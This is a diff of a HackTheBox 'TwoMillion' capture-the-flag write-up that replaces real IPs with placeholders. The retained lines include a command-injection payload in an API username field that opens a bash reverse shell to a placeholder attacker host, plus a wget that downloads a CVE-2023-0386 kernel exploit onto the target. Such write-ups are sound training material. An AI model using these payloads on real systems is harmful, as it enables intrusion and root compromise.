@@ -1,26 +1,18 @@
 `[JS DEOBFUSCATION]` `[API ABUSE]` `[IDOR]` `[COMMAND INJECTION]` `[CREDENTIAL REUSE]` `[CVE-2023-0386]` `[CVE-2023-4911]`
 
----
-
 ![](../.gitbook/assets/twomillion_cover2.png)
 
-**Machine Write-Up — by jhaxx**
+**Machine Write-Up**
 
 ---
 
-| Field | Value |
-|---|---|
-| Target IP | `10.129.229.66` |
-| Hostname | `2million.htb` |
-| Operating System | Ubuntu 22.04.2 LTS (kernel 5.15.70-051570-generic) |
-| Difficulty | Easy |
-| Attacker IP | `10.10.16.27` (tun0) |
+**Platform:** HackTheBox
+**Difficulty:** Easy
+**Operating System:** Ubuntu 22.04.2 LTS (kernel 5.15.70-051570-generic)
 
 ---
 
-## Scenario
-
-### Objective / Scope
+## Objective / Scope
 
 TwoMillion is a commemorative HackTheBox machine released to celebrate the platform's two-million user milestone. It recreates the original HTB v1 platform — the invite-only environment that defined the early community. The scope covers a single Linux host exposing SSH and an nginx-fronted web application, with the objective of chaining API abuse and command injection to gain a foothold, then escalating to root via a disclosed Linux kernel vulnerability in the OverlayFS subsystem.
 
@@ -40,7 +32,7 @@ Initial recon reveals a web application at `2million.htb` themed as the old Hack
 ### Nmap
 
 ```bash
-nmap -sC -sV -Pn 10.129.229.66
+nmap -sC -sV -Pn <TARGET_IP>
 ```
 
 ```
@@ -62,7 +54,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 HTTP redirects to `2million.htb` — add to `/etc/hosts` before proceeding:
 
 ```bash
-echo '10.129.229.66  2million.htb' | sudo tee -a /etc/hosts
+echo '<TARGET_IP>  2million.htb' | sudo tee -a /etc/hosts
 ```
 
 Re-running nmap against the hostname reveals the `PHPSESSID` cookie is issued without the `HttpOnly` flag:
@@ -292,7 +284,7 @@ Host: 2million.htb
 Cookie: PHPSESSID=04is49j22jq7bi3tqk8a4i493v
 Content-Type: application/json
 
-{"username":"test$(bash -c 'exec bash -i &>/dev/tcp/10.10.16.27/4444 <&1')"}
+{"username":"test$(bash -c 'exec bash -i &>/dev/tcp/<ATTACKER_IP>/4444 <&1')"}
 ```
 
 ```bash
@@ -301,7 +293,7 @@ nc -lvnp 4444
 
 ```
 # Console Output
-connect to [10.10.16.27] from (UNKNOWN) [10.129.229.66] 42740
+connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 42740
 www-data@2million:~/html$
 ```
 
@@ -429,7 +421,7 @@ python3 -m http.server 80
 
 ```bash
 # Target
-cd /tmp && wget http://10.10.16.27/CVE-2023-0386.tar.bz2
+cd /tmp && wget http://<ATTACKER_IP>/CVE-2023-0386.tar.bz2
 tar -xjvf CVE-2023-0386.tar.bz2 && cd CVE-2023-0386
 ```
 
